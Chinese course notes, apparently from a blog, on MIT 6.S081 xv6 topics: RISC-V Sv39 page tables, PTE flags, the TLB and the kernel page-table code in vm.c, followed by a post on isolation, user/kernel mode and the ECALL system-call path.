如果cat程序想要向地址1000写入数据，那么cat只会向它自己的地址1000，而不是Shell的地址1000写入数据。所以，基本上来说，每个程序都运行在自己的地址空间，并且这些地址空间彼此之间相互独立。在这种不同地址空间的概念中，cat程序甚至都不具备引用属于Shell的内存地址的能力。这是我们想要达成的终极目标，因为这种方式为我们提供了强隔离性，cat现在不能引用任何不属于自己的内存。 所以现在我们的问题是如何在一个物理内存上，创建不同的地址空间，因为归根到底，我们使用的还是一堆存放了内存信息的DRAM芯片。 虚拟内存可以比物理内存更大，物理内存也可以比虚拟内存更大 如果太多的进程使用了虚拟内存，有可能使物理内存耗尽 kalloc保存了空余的page的列表，如果这个列表为空或者耗尽了，那么kalloc会返回一个空指针，内核会妥善处理并将结果返回给用户应用程序。并告诉用户应用程序，要么是对这个应用程序没有额外的内存了，要么整个机器都没有内存了。 Page页表流程页表是在硬件中通过处理器和内存管理单元（Memory Management Unit）实现。 CPU正在执行指令，例如sd $7, (a0)。 对于任何一条带有地址的指令，其中的地址应该认为是虚拟内存地址而不是物理地址。假设寄存器a0中是地址0x1000，那么这是一个虚拟内存地址。虚拟内存地址会被转到内存管理单元（MMU，Memory Management Unit） 内存管理单元会将虚拟地址翻译成物理地址。之后这个物理地址会被用来索引物理内存，并从物理内存加载，或者向物理内存存储数据。 从CPU的角度来说，一旦MMU打开了，它执行的每条指令中的地址都是虚拟内存地址。 为了能够完成虚拟内存地址到物理内存地址的翻译，MMU会有一个表单，表单中，一边是虚拟内存地址，另一边是物理内存地址。举个例子，虚拟内存地址0x1000对应了一个我随口说的物理内存地址0xFFF0。这样的表单可以非常灵活。 通常来说，内存地址对应关系的表单也保存在内存中。所以CPU中需要有一些寄存器用来存放表单在物理内存中的地址。现在，在内存的某个位置保存了地址关系表单，我们假设这个位置的物理内存地址是0x10。那么在RISC-V上一个叫做SATP的寄存器会保存地址0x10。 这样，CPU就可以告诉MMU，可以从哪找到将虚拟内存地址翻译成物理内存地址的表单。 page table存储在内存中，MMU只是会去查看page table。 每个应用程序都有自己独立的表单，并且这个表单定义了应用程序的地址空间。所以当操作系统将CPU从一个应用程序切换到另一个应用程序时，同时也需要切换SATP寄存器中的内容，从而指向新的进程保存在物理内存中的地址对应表单。这样的话，cat程序和Shell程序中相同的虚拟内存地址，就可以翻译到不同的物理内存地址，因为每个应用程序都有属于自己的不同的地址对应表单。 内核会写SATP寄存器，写SATP寄存器是一条特殊权限指令。所以，用户应用程序不能通过更新这个寄存器来更换一个地址对应表单，否则的话就会破坏隔离性。所以，只有运行在kernel mode的代码可以更新这个寄存器。 虚拟地址到物理地址 虚拟内存地址分为两个部分 index：用来查找page offset：对应一个page中的字节 当MMU在做地址翻译的时候，通过读取虚拟内存地址中的index可以知道物理内存中的page号，这个page号对应了物理内存中的4096个字节。之后虚拟内存地址中的offset指向了page中的4096个字节中的某一个，假设offset是12，那么page中的第12个字节被使用了。将offset加上page的起始地址，就可以得到物理内存地址。 RSIC-V处理器RISC-V的寄存器是64bit，但是并不是所有的64bit都被使用了，高25bit未被使用。 这样的结果是限制了虚拟内存地址的数量，虚拟内存地址的数量现在只有2^39个，大概是512GB。 当然如果有必要的话，最新的处理器或许可以支持更大的地址空间，只需要将未使用的25bit拿出来作为虚拟内存地址的一部分即可。 在剩下的39bit中，有27bit被用来当作index，12bit被用来当作offset。offset必须是12bit，因为对应了一个page的4096个字节。 在RISC-V中，物理内存地址是56bit。所以物理内存地址可以大于单个内存地址空间，但是也最多到2^56。大多数主板还不支持2^56这么大的物理内存，但是原则上，如果你能造出这样的主板，那么最多可以支持2^56字节的物理内存。 物理内存地址是56bit，其中44bit是物理page号（PPN,Physical Page Number)，剩下的12bit是offset完全继承自虚拟内存地址（也就是地址转换时，只需要将虚拟内存中的27bit翻译成物理内存中的44bit的page号，剩下的12bitoffset直接拷贝过来即可。 多级page table 我们之前提到的虚拟内存地址中的27bit的index，实际上是由3个9bit的数字组成（L2，L1，L0）。前9个bit被用来索引最高级的page directory（注：通常page directory是用来索引page table或者其他page directory物理地址的表单) 一个directory是4096Bytes，就跟page的大小是一样的。Directory中的一个条目被称为PTE（Page Table Entry）是64bits，就像寄存器的大小一样，也就是8Bytes。所以一个Directory page有512个条目。 所以实际上，SATP寄存器会指向最高一级的page directory的物理内存地址，之后我们用虚拟内存中index的高9bit用来索引最高一级的page directory，这样我们就能得到一个PPN，也就是物理page号。这个PPN指向了中间级的page directory。 当我们在使用中间级的page directory时，我们通过虚拟内存地址中的L1部分完成索引。接下来会走到最低级的page directory，我们通过虚拟内存地址中的L0部分完成索引。在最低级的page directory中，我们可以得到对应于虚拟内存地址的物理内存地址。 优点如果地址空间中大部分地址都没有使用，你不必为每一个index准备一个条目。举个例子，如果你的地址空间只使用了一个page，4096Bytes。除此之外，你没有使用任何其他的地址。现在，你需要多少个page table entry，或者page table directory来映射这一个page？ 在最高级，你需要一个page directory。在这个page directory中，你需要一个数字是0的PTE，指向中间级page directory。所以在中间级，你也需要一个page directory，里面也是一个数字0的PTE，指向最低级page directory。所以这里总共需要3个page directory（也就是3 * 512个条目）。 而在单级page table中，虽然我们只使用了一个page，还是需要2^27个PTE。这个方案中，我们只需要3 * 512个PTE。所需的空间大大减少了。这是实际上硬件采用这种层次化的3级page directory结构的主要原因。 PTE 物理页号（Physical Page Number，PPN）: 与物理地址字段类似，PPN存储与虚拟地址关联的物理内存地址。在RISC-V中，PTE的高位部分存储PPN。 有效位（Valid，V）: 有效位表示此PTE中存储的映射是否有效。如果有效位设置为1，表示此PTE的虚拟地址已映射到物理内存中。如果设置为0，则表示该虚拟地址尚未映射。 读（Read，R）: 读权限位表示允许对该页面进行读访问。 写（Write，W）: 写权限位表示允许对该页面进行写访问。 执行（Execute，X）: 执行权限位表示允许对该页面进行执行访问。 用户（User，U）: 用户权限位表示该页面是否允许在用户模式下访问。如果设置为1，则允许用户模式访问；如果设置为0，则仅允许特权模式访问。 全局（Global，G）: 全局位表示该页面是否对所有地址空间可见。如果设置为1，则表示该页面在地址空间切换时不会从转换查找缓冲器（Translation Lookaside Buffer，TLB）中清除。这对于操作系统内核和共享库等全局数据结构特别有用。 访问（Accessed，A）: 访问位表示自上次清零以来该页面是否被访问过。当发生内存访问时，硬件会自动设置访问位。 脏（Dirty，D）: 脏位表示自上次清零以来该页面是否被修改过。当某个页面的内容被修改时，硬件会自动设置脏位。 软件可用位（Software Use，SW）: 这些位是为操作系统软件保留的，可以在页表遍历过程中用于自定义用途。 页表缓存（Translation Lookaside Buffer）观察page table的结构，可以发现，当处理器从内存加载或者存储数据时，基本上都要做3次内存查找，第一次在最高级的page directory，第二次在中间级的page directory，最后一次在最低级的page directory。所以对于一个虚拟内存地址的寻址，需要读三次内存，这里代价有点高。所以实际中，几乎所有的处理器都会对于最近使用过的虚拟地址的翻译结果有缓存。这个缓存被称为：Translation Lookside Buffer（通常翻译成页表缓存）。你会经常看到它的缩写TLB。基本上来说，这就是Page Table Entry的缓存，也就是PTE的缓存。 当处理器第一次查找一个虚拟地址时，硬件通过3级page table得到最终的PPN，TLB会保存虚拟地址到物理地址的映射关系。这样下一次当你访问同一个虚拟地址时，处理器可以查看TLB，TLB会直接返回物理地址，而不需要通过page table得到结果。 TLB实现的具体细节不是我们要深入讨论的内容。这是处理器中的一些逻辑，对于操作系统来说是不可见的，操作系统也不需要知道TLB是如何工作的。你们需要知道TLB存在的唯一原因是，如果你切换了page table，操作系统需要告诉处理器当前正在切换page table，处理器会清空TLB。因为本质上来说，如果你切换了page table，TLB中的缓存将不再有用，它们需要被清空，否则地址翻译可能会出错。所以操作系统知道TLB是存在的，但只会时不时的告诉操作系统，现在的TLB不能用了，因为要切换page table了。在RISC-V中，清空TLB的指令是sfence_vma。 整个CPU和MMU都在处理器芯片中，所以在一个RISC-V芯片中，有多个CPU核，MMU和TLB存在于每一个CPU核里面。RISC-V处理器有L1 cache，L2 Cache，有些cache是根据物理地址索引的，有些cache是根据虚拟地址索引的，由虚拟地址索引的cache位于MMU之前，由物理地址索引的cache位于MMU之后。 Kernel Page Table 在XV6中，page table是如何工作的? 当操作系统启动时，会从地址0x80000000开始运行，这个地址其实也是由硬件设计者决定的。 主板的设计人员决定了，在完成了虚拟到物理地址的翻译之后，如果得到的物理地址大于0x80000000会走向DRAM芯片，如果得到的物理地址低于0x80000000会走向不同的I&#x2F;O设备。这是由这个主板的设计人员决定的物理结构。 首先，地址0是保留的，地址0x10090000对应以太网，地址0x80000000对应DDR内存，处理器外的易失存储（Off-Chip Volatile Memory），也就是主板上的DRAM芯片。 所有的事情都是由硬件，即主板决定的，CPU只是主板的一小部分，DRAM芯片位于处理器之外。是主板设计者将处理器，DRAM和许多I&#x2F;O设备汇总在一起。对于一个操作系统来说，CPU只是一个部分，I&#x2F;O设备同样也很重要。所以当你在写一个操作系统时，你需要同时处理CPU和I&#x2F;O设备，比如你需要向互联网发送一个报文，操作系统需要调用网卡驱动和网卡来实际完成这个工作。 地址0x1000是boot ROM的物理地址，当你对主板上电，主板做的第一件事情就是运行存储在boot ROM中的代码，当boot完成之后，会跳转到地址0x80000000，操作系统需要确保那个地址有一些数据能够接着启动操作系统。 物理地址还有一些其他的I&#x2F;O设备 PLIC是中断控制器（Platform-Level Interrupt Controller） CLINT（Core Local Interruptor）也是中断的一部分。所以多个设备都能产生中断，需要中断控制器来将这些中断路由到合适的处理函数。 UART0（Universal Asynchronous Receiver&#x2F;Transmitter）负责与Console和显示器交互。 VIRTIO disk，与磁盘进行交互。 高于0x80000000的物理地址对应DRAM芯片，但是对于例如以太网接口，也有一个特定的低于0x80000000的物理地址，我们可以对这个叫做内存映射I&#x2F;O（Memory-mapped I&#x2F;O）的地址执行读写指令，来完成设备的操作。 地址0x02000000对应CLINT，当你向这个地址执行读写指令，你是向实现了CLINT的芯片执行读写。这里你可以认为你直接在与设备交互，而不是读写物理内存。 物理地址总共有2^56那么多，但是你不用在主板上接入那么多的内存。所以不论主板上有多少DRAM芯片，总是会有一部分物理地址没有被用到。实际上在XV6中，我们限制了内存的大小是128MB。 在RISC-V中有一个多路输出选择器（demultiplexer）可以帮助CPU将指令送到正确的I&#x2F;O设备。 两件重要的事情： 有一些page在虚拟内存中的地址很靠后，比如kernel stack在虚拟内存中的地址就很靠后。这是因为在它之下有一个未被映射的Guard page，这个Guard page对应的PTE的Valid 标志位没有设置，这样，如果kernel stack耗尽了，它会溢出到Guard page，但是因为Guard page的PTE中Valid标志位未设置，会导致立即触发page fault，这样的结果好过内存越界之后造成的数据混乱。立即触发一个panic（也就是page fault），你就知道kernel stack出错了。同时我们也又不想浪费物理内存给Guard page，所以Guard page不会映射到任何物理内存，它只是占据了虚拟地址空间的一段靠后的地址。&#96; 同时，kernel stack被映射了两次，在靠后的虚拟地址映射了一次，在PHYSTOP下的Kernel data中又映射了一次，但是实际使用的时候用的是上面的部分，因为有Guard page会更加安全。 权限：例如Kernel text page被标位R-X，意味着你可以读它，也可以在这个地址段执行指令，但是你不能向Kernel text写数据。通过设置权限我们可以尽早的发现Bug从而避免Bug。对于Kernel data需要能被写入，所以它的标志位是RW-，但是你不能在这个地址段运行指令，所以它的X标志位未被设置。（注，所以，kernel text用来存代码，代码可以读，可以运行，但是不能篡改，kernel data用来存数据，数据可以读写，但是不能通过数据伪装代码在kernel中运行） 每一个用户进程都有一个对应的kernel stack。 在kernel page table中，有一段Free Memory，它对应了物理内存中的一段地址。XV6使用这段free memory来存放用户进程的page table，text和data。如果我们运行了非常多的用户进程，某个时间点我们会耗尽这段内存，这个时候fork或者exec会返回错误。 当kernel创建了一个进程，针对这个进程的page table也会从Free memory中分配出来。内核会为用户进程的page table分配几个page，并填入PTE。在某个时间点，当内核运行了这个进程，内核会将进程的根page table的地址加载到SATP中。从那个时间点开始，处理器会使用内核为那个进程构建的虚拟地址空间。 Code:Creating an address space大部分用于操作地址空间和页表的xv6代码位于vm.c（kernel&#x2F;vm.c）中。主要数据结构是pagetable_t，它实际上是指向RISC-V 35根页表页面的指针；pagetable_t可以是内核页表，也可以是每个进程的页表之一。主要函数为walk，该函数查找虚拟地址的PTE，并且mappages安装新映射的PTE。以kvm开头的函数操作内核页表；以uvm开头的函数操作用户页表；其他功能同时用于两者。copyout和copyin将数据复制和从作为系统调用参数提供的用户虚拟地址复制出来；它们在vm.c中因为需要明确翻译这些地址才能找到相应物理存储器。 在引导序列早期，main调用kvminit（kernel&#x2F;vm.c:54）使用kvmmake（kernel&#x2F;vm.c:20）创建内核页面表格。 12345voidkvminit(void)&#123; kernel_pagetable = kvmmake();&#125; 1234567891011121314151617181920212223242526272829303132pagetable_tkvmmake(void)&#123; pagetable_t kpgtbl; kpgtbl = (pagetable_t) kalloc(); memset(kpgtbl, 0, PGSIZE); // uart registers kvmmap(kpgtbl, UART0, UART0, PGSIZE, PTE_R | PTE_W); // virtio mmio disk interface kvmmap(kpgtbl, VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W); // PLIC kvmmap(kpgtbl, PLIC, PLIC, 0x400000, PTE_R | PTE_W); // map kernel text executable and read-only. kvmmap(kpgtbl, KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X); // map kernel data and the physical RAM we&#x27;ll make use of. kvmmap(kpgtbl, (uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W); // map the trampoline for trap entry/exit to // the highest virtual address in the kernel. kvmmap(kpgtbl, TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X); // allocate and map a kernel stack for each process. proc_mapstacks(kpgtbl); return kpgtbl;&#125; 此调用发生在xv6启动RISC-V分页之前，因此地址直接引用物理存储器。kvmmake首先分配一个物理存储器页面来保存根页面- 表示页面; 然后它调用kvmmap来安装内核所需的转换。这些转换包括内核指令和数据、PHYSTOP以下 的物理存储器以及实际上是设备的内存范围。 proc_mapstacks（kernel&#x2F;proc.c:33）为每个进程分配一个内核堆栈。它调用kvmmap将每个堆栈映射到由KSTACK生成的虚拟地址，这样可以留出无效的堆栈保护页。 12345678910111213141516// Allocate a page for each process&#x27;s kernel stack.// Map it high in memory, followed by an invalid// guard page.voidproc_mapstacks(pagetable_t kpgtbl)&#123; struct proc *p; for(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123; char *pa = kalloc(); if(pa == 0) panic(&quot;kalloc&quot;); uint64 va = KSTACK((int) (p - proc)); kvmmap(kpgtbl, va, (uint64)pa, PGSIZE, PTE_R | PTE_W); &#125;&#125; kvmmap（kernel&#x2F;vm.c:127）调用mappages（kernel&#x2F;vm.c:138），该函数为一系列虚拟地址范围安装映射到相应物理地址的页面表格中。 123456789// add a mapping to the kernel page table.// only used when booting.// does not flush TLB or enable paging.voidkvmmap(pagetable_t kpgtbl, uint64 va, uint64 pa, uint64 sz, int perm)&#123; if(mappages(kpgtbl, va, sz, pa, perm) != 0) panic(&quot;kvmmap&quot;);&#125; 12345678910111213141516171819202122232425262728// Create PTEs for virtual addresses starting at va that refer to// physical addresses starting at pa. va and size might not// be page-aligned. Returns 0 on success, -1 if walk() couldn&#x27;t// allocate a needed page-table page.intmappages(pagetable_t pagetable, uint64 va, uint64 size, uint64 pa, int perm)&#123; uint64 a, last; pte_t *pte; if(size == 0) panic(&quot;mappages: size&quot;); a = PGROUNDDOWN(va); last = PGROUNDDOWN(va + size - 1); for(;;)&#123; if((pte = walk(pagetable, a, 1)) == 0) return -1; if(*pte &amp; PTE_V) panic(&quot;mappages: remap&quot;); *pte = PA2PTE(pa) | perm | PTE_V; if(a == last) break; a += PGSIZE; pa += PGSIZE; &#125; return 0;&#125; 它对于范围中的每个虚拟地址单独执行此操作，在页面间隔处执行此操作。对于要映射的每个虚拟地址，mappages都会调用walk来查找该地址PTE的位置。然后，它初始化PTE以保存相关物理页号、所需权限（PTE_W、PTE_X和&#x2F;或 PTE_R）和标记PTE_V作为有效(kernel&#x2F;vm.c:153)。 12345678910111213141516171819202122232425262728// Create PTEs for virtual addresses starting at va that refer to// physical addresses starting at pa. va and size might not// be page-aligned. Returns 0 on success, -1 if walk() couldn&#x27;t// allocate a needed page-table page.intmappages(pagetable_t pagetable, uint64 va, uint64 size, uint64 pa, int perm)&#123; uint64 a, last; pte_t *pte; if(size == 0) panic(&quot;mappages: size&quot;); a = PGROUNDDOWN(va); last = PGROUNDDOWN(va + size - 1); for(;;)&#123; if((pte = walk(pagetable, a, 1)) == 0) return -1; if(*pte &amp; PTE_V) panic(&quot;mappages: remap&quot;); *pte = PA2PTE(pa) | perm | PTE_V; if(a == last) break; a += PGSIZE; pa += PGSIZE; &#125; return 0;&#125; walk（kernel&#x2F;vm.c:81）模仿RISC-V分页硬件，查找虚拟地址的PTE。walk每次下降3级页面表9位。它使用每个级别的9位虚拟地址来查找下一级页面表或最终页面的PTE（kernel&#x2F;vm.c:87）。如果PTE无效，则尚未分配所需页面；如果设置了alloc参数，则walk将分配新的页表页并将其物理地址放入PTE中。 12345678910111213141516171819202122232425262728293031// Return the address of the PTE in page table pagetable// that corresponds to virtual address va. If alloc!=0,// create any required page-table pages.//// The risc-v Sv39 scheme has three levels of page-table// pages. A page-table page contains 512 64-bit PTEs.// A 64-bit virtual address is split into five fields:// 39..63 -- must be zero.// 30..38 -- 9 bits of level-2 index.// 21..29 -- 9 bits of level-1 index.// 12..20 -- 9 bits of level-0 index.// 0..11 -- 12 bits of byte offset within the page.pte_t *walk(pagetable_t pagetable, uint64 va, int alloc)&#123; if(va &gt;= MAXVA) panic(&quot;walk&quot;); for(int level = 2; level &gt; 0; level--) &#123; pte_t *pte = &amp;pagetable[PX(level, va)]; if(*pte &amp; PTE_V) &#123; pagetable = (pagetable_t)PTE2PA(*pte); &#125; else &#123; if(!alloc || (pagetable = (pde_t*)kalloc()) == 0) return 0; memset(pagetable, 0, PGSIZE); *pte = PA2PTE(pagetable) | PTE_V; &#125; &#125; return &amp;pagetable[PX(0, va)];&#125; 它返回树中最低层的PTE地址。以上代码依赖于物理内存被直接映射到内核虚拟地址空间中。例如，当walk下降页面表级别时，它从PTE获取下一个向下级别页面表(物理)地址，并使用该地址作为虚拟地址获取下一个向下级别的 PTE 。 12345678910111213/ Switch h/w page table register to the kernel&#x27;s page table,// and enable paging.voidkvminithart()&#123; // wait for any previous writes to the page table memory to finish. sfence_vma(); w_satp(MAKE_SATP(kernel_pagetable)); // flush stale entries from the TLB. sfence_vma();&#125; 主函数调用kvminithart(kernel &#x2F; vm.c：62)安装内核页表。 它将根页表页的物理地址写入satp寄存器。之后CPU将使用内核页表翻译地址。由于内核使用身份映射，现在指令集合上一条指令对应正确的物理内存位置。 每个RISC-V CPU都会在转换前缓存TLB中相应信息，在xv6更改某一页时必须告诉CPU使相应的缓存TLB条目失效。如果没有这样做，那么在以后的某个时候，TLB可能会使用旧的缓存映射，指向此时已分配给另一个进程的物理页面，并且结果是进程可能能够涂写其他进程的内存。RISC-V有一种指令sfence.vma可以刷新当前CPU的TLB。Xv6在重新加载satp寄存器之后，在kvminithart中执行sfence.vma，并在跳板代码(kernel&#x2F;trampoline.S:79)中切换到36用户页表并返回用户空间前执行。 为了避免刷新完整的TLB，RISC-V CPU可以支持地址空间标识符（ASIDs）。然后内核只需清除特定地址空间的TLB条目即可","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://example.com/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"MIT6.S081 Operating System Engineering","slug":"课程学习/MIT6-S081-Operating-System-Engineering","permalink":"http://example.com/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/MIT6-S081-Operating-System-Engineering/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"MIT6 S081 Operating System Engineering Lecture03 OS Organization and System Call","slug":"MIT6-S081-Operating-System-Engineering-Lecture03-OS-Organization-and-System-Call","date":"2023-04-02T06:44:05.000Z","updated":"2023-04-06T08:24:13.187Z","comments":true,"path":"2023/04/02/MIT6-S081-Operating-System-Engineering-Lecture03-OS-Organization-and-System-Call/","link":"","permalink":"http://example.com/2023/04/02/MIT6-S081-Operating-System-Engineering-Lecture03-OS-Organization-and-System-Call/","excerpt":"Topic Isolation:Isolation是设计操作系统组织结构的驱动力 System Call:System call是你的应用程序能够转换到内核执行的基本方法 Kernel mode&#x2F;user mode Isolation","text":"Topic Isolation:Isolation是设计操作系统组织结构的驱动力 System Call:System call是你的应用程序能够转换到内核执行的基本方法 Kernel mode&#x2F;user mode Isolation应用程序之间有隔离性我们在用户空间有多个应用程序，例如Shell、echo、find等等。但是，如果你通过Shell运行你们的Prime代码（lab1中的一个部分）时，假设你们的代码出现了问题，Shell不应该会影响到其他的应用程序。举个反例，如果Shell出现问题时，杀掉了其他的进程，这将会非常糟糕。所以你需要在不同的应用程序之间有强隔离性。 应用程序与操作系统之间有隔离性操作系统某种程度上为所有的应用程序服务。当你的应用程序出现问题时，你会希望操作系统不会因此而崩溃。比如说你向操作系统传递了一些奇怪的参数，你会希望操作系统仍然能够很好的处理它们（能较好的处理异常情况）。所以，你也需要在应用程序和操作系统之间有强隔离性。 如果没有操作系统如果没有操作系统，或者操作系统只是一些库文件，比如说你在使用Python，通过import os你就可以将整个操作系统加载到你的应用程序中。那么现在，我们有一个Shell，并且我们引用了代表操作系统的库。同时，我们有一些其他的应用程序，例如echo。 通常来说，如果没有操作系统，应用程序会直接与硬件交互。比如，应用程序可以直接看到CPU的多个核，看到磁盘，内存。所以现在应用程序和硬件资源之间没有一个额外的抽象层。 调度及复用隔离问题使用操作系统的一个目的是为了同时运行多个应用程序，所以时不时的，CPU会从一个应用程序切换到另一个应用程序。我们假设硬件资源里只有一个CPU核，并且我们现在在这个CPU核上运行Shell。但是时不时的，也需要让其他的应用程序也可以运行。现在我们没有操作系统来帮我们完成切换，所以Shell就需要时不时的释放CPU资源。 为了不变成一个恶意程序，Shell在发现自己运行了一段时间之后，需要让别的程序也有机会能运行。这种机制有时候称为协同调度（Cooperative Scheduling）。但是这里的场景并没有很好的隔离性，比如说Shell中的某个函数有一个死循环，那么Shell永远也不会释放CPU，进而其他的应用程序也不能够运行，甚至都不能运行一个第三方的程序来停止或者杀死Shell程序。所以这种场景下，我们基本上得不到真正的multiplexing（CPU在多进程同分时复用）。而这个特性是非常有用的，不论应用程序在执行什么操作，multiplexing都会迫使应用程序时不时的释放CPU，这样其他的应用程序才能运行。 内存隔离问题假设现在物理内存中的一部分被Shell使用，另一部分被echo使用。因为两个应用程序的内存之间没有边界，如果echo程序将数据存储在属于Shell的一个内存地址中，那么就echo就会覆盖Shell程序内存中的内容。 使用操作系统的一个原因，甚至可以说是主要原因就是为了实现multiplexing和内存隔离。如果你不使用操作系统，并且应用程序直接与硬件交互，就很难实现这两点。所以，将操作系统设计成一个库，并不是一种常见的设计。你或许可以在一些实时操作系统中看到这样的设计，因为在这些实时操作系统中，应用程序之间彼此相互信任。但是在大部分的其他操作系统中，都会强制实现硬件资源的隔离。 从隔离的角度来看Unix接口如果我们从隔离的角度来稍微看看Unix接口，那么我们可以发现，接口被精心设计以实现资源的强隔离，也就是multiplexing和物理内存的隔离。接口通过抽象硬件资源，从而使得提供强隔离性成为可能。 Example 1之前通过fork创建了进程。进程本身不是CPU，但是它们对应了CPU，它们使得你可以在CPU上运行计算任务。所以你懂的，应用程序不能直接与CPU交互，只能与进程交互。操作系统内核会完成不同进程在CPU上的切换。所以，操作系统不是直接将CPU提供给应用程序，而是向应用程序提供“进程”，进程抽象了CPU，这样操作系统才能在多个应用程序之间复用一个或者多个CPU。 我们在实验中使用的RISC-V处理器实际上是有4个核。所以你可以同时运行4个进程，一个进程占用一个核。但是假设你有8个应用程序，操作系统会分时复用这些CPU核，比如说对于一个进程运行100毫秒，之后内核会停止运行并将那个进程从CPU中卸载，再加载另一个应用程序并再运行100毫秒。通过这种方式使得每一个应用程序都不会连续运行超过100毫秒。这里只是一些基本概念，我们在接下来的几节课中会具体的看这里是如何实现的。 我们可以认为exec抽象了内存。当我们在执行exec系统调用的时候，我们会传入一个文件名，而这个文件名对应了一个应用程序的内存镜像。内存镜像里面包括了程序对应的指令，全局的数据。应用程序可以逐渐扩展自己的内存，但是应用程序并没有直接访问物理内存的权限，例如应用程序不能直接访问物理内存的1000-2000这段地址。不能直接访问的原因是，操作系统会提供内存隔离并控制内存，操作系统会在应用程序和硬件资源之间提供一个中间层。exec是这样一种系统调用，它表明了应用程序不能直接访问物理内存。 Example 2files基本上来说抽象了磁盘。应用程序不会直接读写挂在计算机上的磁盘本身，并且在Unix中这也是不被允许的。在Unix中，与存储系统交互的唯一方式就是通过files。Files提供了非常方便的磁盘抽象，你可以对文件命名，读写文件等等。之后，操作系统会决定如何将文件与磁盘中的块对应，确保一个磁盘块只出现在一个文件中，并且确保用户A不能操作用户B的文件。通过files的抽象，可以实现不同用户之间和同一个用户的不同进程之间的文件强隔离。 Defensive 防御性：当你在做内核开发时，这是一种你需要熟悉的重要思想。操作系统需要确保所有的组件都能工作，所以它需要做好准备抵御来自应用程序的攻击。如果说应用程序无意或者恶意的向系统调用传入一些错误的参数就会导致操作系统崩溃，那就太糟糕了。在这种场景下，操作系统因为崩溃了会拒绝为其他所有的应用程序提供服务。所以操作系统需要以这样一种方式来完成：操作系统需要能够应对恶意的应用程序。 隔离性：另一个需要考虑的是，应用程序不能够打破对它的隔离。应用程序非常有可能是恶意的，它或许是由攻击者写出来的，攻击者或许想要打破对应用程序的隔离，进而控制内核。一旦有了对于内核的控制能力，你可以做任何事情，因为内核控制了所有的硬件资源。 所以操作系统或者说内核需要具备防御性来避免类似的事情发生。实际中，要满足这些要求还有点棘手。在Linux中，时不时的有一些内核的bug使得应用程序可以打破它的隔离域并控制内核。这里需要持续的关注，并尽可能的提供最好的防御性。当你在开发内核时，防御性是你必须掌握的一个思想。实际中的应用程序或许就是恶意的，这意味着我们需要在应用程序和操作系统之间提供强隔离性。如果操作系统需要具备防御性，那么在应用程序和操作系统之间需要有一堵厚墙，并且操作系统可以在这堵墙上执行任何它想执行的策略。 通常来说，需要通过硬件来实现强隔离性。这里的硬件主要包括两部分，一个是user&#x2F;kernel mode，kernel mode在RISC-V中被称为Supervisor mode但是其实是同一种东西；第二部分是page table或者虚拟内存（Virtual Memory） 所以，所有的处理器，如果需要运行能够支持多个应用程序的操作系统，需要同时支持user&#x2F;kernle mode和虚拟内存。具体的实现或许会有细微的差别，但是基本上来说所有的处理器需要能支持这些。 硬件对于强隔离的支持user&#x2F;kernel mode为了支持user&#x2F;kernel mode，处理器会有两种操作模式，第一种是user mode，第二种是kernel mode。当运行在kernel mode时，CPU可以运行特定权限的指令（privileged instructions）；当运行在user mode时，CPU只能运行普通权限的指令（unprivileged instructions）。 普通权限的指令都是一些你们熟悉的指令，例如将两个寄存器相加的指令ADD、将两个寄存器相减的指令SUB、跳转指令JRC、BRANCH指令等等。这些都是普通权限指令，所有的应用程序都允许执行这些指令。 特殊权限指令主要是一些直接操纵硬件的指令和设置保护的指令，例如设置page table寄存器、关闭时钟中断。在处理器上有各种各样的状态，操作系统会使用这些状态，但是只能通过特殊权限指令来变更这些状态。 举个例子，当一个应用程序尝试执行一条特殊权限指令，因为不允许在user mode执行特殊权限指令，处理器会拒绝执行这条指令。通常来说，这时会将控制权限从user mode切换到kernel mode，当操作系统拿到控制权之后，或许会杀掉进程，因为应用程序执行了不该执行的指令。 在处理器里面有一个flag。在处理器的一个bit，当它为1的时候是user mode，当它为0时是kernel mode。当处理器在解析指令时，如果指令是特殊权限指令，并且该bit被设置为1，处理器会拒绝执行这条指令，就像在运算时不能除以0一样。设置那个bit位的指令必须是特殊权限指令，因为应用程序不应该能够设置那个bit到kernel mode，否则的话应用程序就可以运行各种特殊权限指令了。所以那个bit是被保护的。 RISC-V还有第三种模式称为machine mode。在大多数场景下，我们会忽略这种模式，所以我们实际上有三级权限user&#x2F;kernel&#x2F;machine。 page table每一个进程都会有自己独立的page table，这样的话，每一个进程只能访问出现在自己page table中的物理内存。操作系统会设置page table，使得每一个进程都有不重合的物理内存，这样一个进程就不能访问其他进程的物理内存，因为其他进程的物理内存都不在它的page table中。一个进程甚至都不能随意编造一个内存地址，然后通过这个内存地址来访问其他进程的物理内存。这样就给了我们内存的强隔离性。 基本上来说，page table定义了对于内存的视图，而每一个用户进程都有自己对于内存的独立视图。这给了我们非常强的内存隔离性。 User&#x2F;Kernel mode切换我们可以认为user&#x2F;kernel mode是分隔用户空间和内核空间的边界，用户空间运行的程序运行在user mode，内核空间的程序运行在kernel mode。操作系统位于内核空间。 当ls程序运行的时候，会调用read&#x2F;write系统调用；Shell程序会调用fork或者exec系统调用，所以必须要有一种方式可以使得用户的应用程序能够将控制权以一种协同工作的方式转移到内核，这样内核才能提供相应的服务。 Ecall在RISC-V中，有一个专门的指令用来实现控制权的转换功能，叫做ECALL。ECALL接收一个数字参数，当一个用户程序想要将程序执行的控制权转移到内核，它只需要执行ECALL指令，并传入一个数字。这里的数字参数代表了应用程序想要调用的System Call。 ECALL会跳转到内核中一个特定，由内核控制的位置。在XV6中存在一个唯一的系统调用接入点，每一次应用程序执行ECALL指令，应用程序都会通过这个接入点进入到内核中。举个例子，不论是Shell还是其他的应用程序，当它在用户空间执行fork时，它并不是直接调用操作系统中对应的函数，而是调用ECALL指令，并将fork对应的数字作为参数传给ECALL。之后再通过ECALL跳转到内核。 在内核侧，有一个位于syscall.c的函数syscall，每一个从应用程序发起的系统调用都会调用到这个syscall函数，syscall函数会检查ECALL的参数，通过这个参数内核可以知道需要调用的是fork。 